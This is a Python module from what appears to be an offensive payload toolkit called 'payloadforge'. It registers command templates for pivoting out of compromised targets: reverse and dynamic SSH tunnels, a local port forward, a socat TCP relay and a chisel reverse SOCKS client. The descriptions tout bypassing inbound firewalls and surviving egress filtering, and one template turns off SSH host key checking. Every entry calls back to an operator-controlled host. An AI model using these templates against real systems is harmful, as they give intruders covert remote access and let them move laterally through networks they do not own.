"""SSH tunnel and port-forwarding helpers."""

from payloadforge.payloads.registry import register

register(
    "ssh_reverse_socks",
    "tunnel", "ssh",
    "ssh -N -R {lport}:localhost:22 user@{lhost}",
    "Reverse SSH tunnel: exposes the target's local port back to your listener. Useful for pivoting through NAT.",
    testable=True,
    test_note="Runs on Linux/macOS. Windows requires OpenSSH feature.",
    tags=["ssh", "reverse", "pivot"],
)

register(
    "ssh_dynamic_socks",
    "tunnel", "ssh",
    "ssh -N -D 1080 user@{lhost}",
    "Dynamic SOCKS5 proxy: routes traffic through the SSH server. Point your browser at localhost:1080.",
    testable=True,
    tags=["ssh", "socks", "pivot"],
)

register(
    "ssh_local_forward",
    "tunnel", "ssh",
    "ssh -N -L {lport}:internal.host:80 user@{lhost}",
    "Local port-forward: opens {lport} on your machine that tunnels to an internal service.",
    testable=True,
    tags=["ssh", "forward", "pivot"],
)

register(
    "ssh_reverse_shell_cmd",
    "tunnel", "bash",
    "ssh -o StrictHostKeyChecking=no -R 0:localhost:{lport} -N user@{lhost}",
    "Reverse SSH tunnel where the target initiates the connection (bypasses inbound firewalls).",
    testable=True,
    tags=["ssh", "reverse"],
)

register(
    "socat_reverse",
    "tunnel", "socat",
    "socat TCP-LISTEN:{lport},fork,reuseaddr TCP:{lhost}:{lport}",
    "Socat-based TCP relay for pivoting between network segments.",
    testable=True,
    tags=["socat", "relay", "pivot"],
)

register(
    "chisel_client",
    "tunnel", "bash",
    "./chisel client {lhost}:{lport} R:socks",
    "Chisel reverse SOCKS proxy — HTTP-tunneled, survives egress filtering that blocks raw SSH.",
    testable=False,
    test_note="Requires chisel binary on target.",
    tags=["chisel", "socks", "pivot"],
)
